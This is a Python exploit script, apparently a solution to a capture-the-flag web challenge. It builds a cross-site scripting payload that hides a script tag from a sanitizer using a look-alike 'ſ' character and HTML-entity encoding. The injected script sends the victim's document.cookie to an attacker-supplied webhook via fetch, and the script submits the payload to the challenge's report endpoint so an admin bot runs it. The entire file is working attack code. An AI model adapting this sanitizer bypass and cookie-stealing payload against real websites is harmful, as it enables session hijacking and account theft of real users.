import sys
import urllib.request
import urllib.parse

challenge_url = 'https://translator-web.challs3.infobahnc.tf/report'

if len(sys.argv) < 2:
	print( "First argument to script must be webhook where cookie will be sent" )
	sys.exit(1)

# URL to send cookie to
webhook = sys.argv[1]

script = 'data:text/javascript,fetch(\'' + webhook + "?cookie=' + document.cookie)"

start = '<b><style> <ſcript src="'
end = '"></style><div title="</ſcript>"></div>'

scriptConverted = ""
for char in script:
	scriptConverted += '&#' + str(ord( char )) + ';'

payload = start + scriptConverted + end
print( "Sending payload: " + payload + "\n" )

print( "POST-ing to " + challenge_url + "\n" )
req = urllib.request.Request( challenge_url, data=urllib.parse.urlencode({"txt": payload}).encode('ascii'))
with urllib.request.urlopen(req) as resp:
	print( resp.read().decode('utf-8') )

print( "Check logs of " + webhook + " to find flag.\n" )
